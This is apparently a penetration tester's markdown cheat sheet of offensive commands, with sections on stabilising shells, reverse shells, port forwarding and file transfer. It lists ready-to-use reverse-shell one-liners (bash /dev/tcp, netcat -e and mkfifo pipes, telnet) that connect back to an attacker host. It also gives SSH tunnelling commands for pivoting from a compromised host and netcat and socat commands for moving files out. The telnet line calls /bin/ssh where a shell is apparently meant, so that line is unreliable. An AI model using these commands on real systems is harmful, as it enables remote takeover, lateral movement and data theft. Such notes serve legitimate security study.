## [../](../)

# Shells

## Stabilizing shell

```text
SHELL=/bin/bash script -q /dev/null
[Ctrl + Z]
stty raw -echo
fg
reset
xterm
```

## Reverse shells

### Bash

```text
bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'
```

### Netcat

```text
nc -e /bin/sh <LHOST> <LPORT>
nc -c /bin/sh <LHOST> <LPORT>
rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/y
```

### Telnet

```text
rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/ssh -i 2>&1|telnet <LHOST> <LPORT> >/tmp/y
```

# Port forwarding

## rinetd

```text
rinetd
cat /etc/rinetd.conf
0.0.0.0 <local_port> <target> <target_port>
sudo service rinetd restart
ss -antp
```

## SSH

```text
# run on target machine
ssh -R 4444:127.0.0.1:3306 kali@<lhost>

# now you can connect to target's mysql port from your kali machine
mysql -u root -h 127.0.0.1 -P 4444
```

```text
# -L local
# -R remote
# -D dynamic

# attacker(a) <---internet---> initial_target(i) <---local_network---> target(t)
a> ssh -N -L 0.0.0.0:<a_port>:<t_ip>:<t_port> <user>@<i_port>

# attacker(a) <---firewall---> target(t)
t> ssh -N -R <a_ip>:<a_port>:localhost:<t_port> <user>@<a_ip>

# cont. on page 606
```

# Transfering files

### Netcat

Netcat is the easiest way to transfer files between Linux systems.

```text
# source
nc -nv <ip> <port> < <file>

# destination
nc -lvnp <port> > <file>
```

### Socat

You can also use socat if you want to use encrypted tunnel.

```text
# source
socat TCP4-LISTEN:<port>,fork file:<src_path>

# destination
socat TCP4:<ip>:<port> file:<dst_path>,create
```

